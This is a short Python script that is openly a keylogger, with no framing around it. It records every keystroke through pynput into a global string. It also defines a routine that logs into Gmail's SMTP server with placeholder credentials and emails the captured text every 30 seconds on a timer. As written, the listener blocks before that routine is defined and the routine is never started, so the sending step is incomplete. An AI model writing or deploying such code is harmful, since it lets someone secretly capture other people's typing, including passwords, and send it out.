import pynput.keyboard 
import smtplib
import threading


logs = ""

#logger
def callback_function(key):
    global logs
    try:

        logs = logs + str(key.char.encode("utf-8"))
        print(logs)

    
    except AttributeError:
        if key == key.space:
            logs = logs + " "
        else:
            logs = logs + str(key)

#smtp
def send_email(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email, message)
    email_server.quit()


keyLoggerListener = pynput.keyboard.Listener(on_press = callback_function)
with keyLoggerListener:
    keyLoggerListener.join()

#thread
def thread():
    global logs
    send_email("your-email","your-password", logs )
    logs = ""
    timer = threading.Timer(30,thread)
    timer.start()
